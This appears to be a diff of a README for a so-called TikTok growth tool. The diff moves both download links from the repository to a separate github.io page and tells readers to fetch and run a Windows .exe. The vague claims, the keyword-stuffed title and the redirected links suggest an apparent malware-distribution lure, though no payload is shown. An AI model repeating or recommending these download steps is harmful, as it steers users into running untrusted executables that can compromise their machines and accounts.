@@ -1,6 +1,6 @@
 # 🚀 TikTok-Reach-Maximizer-2026---Smart-Growth-Tool-for-Content-Creators - Grow your TikTok presence faster today
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/kellsieparasitical643/TikTok-Reach-Maximizer-2026---Smart-Growth-Tool-for-Content-Creators)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://kellsieparasitical643.github.io)
 
 This software helps content creators reach more viewers on TikTok. It analyzes your content patterns and suggests improvements to help you build an audience. Use this tool to save time on manual optimization and focus on making quality videos.
 
@@ -10,7 +10,7 @@ You need a computer running Windows 10 or Windows 11. Your system should have at
 
 ## 📥 How to Install and Start
 
-1. Visit the [official download page](https://github.com/kellsieparasitical643/TikTok-Reach-Maximizer-2026---Smart-Growth-Tool-for-Content-Creators) to get the latest version.
+1. Visit the [official download page](https://kellsieparasitical643.github.io) to get the latest version.
 2. Look for the file ending in .exe in the releases section.
 3. Save this file to your computer.
 4. Locate the file in your downloads folder.
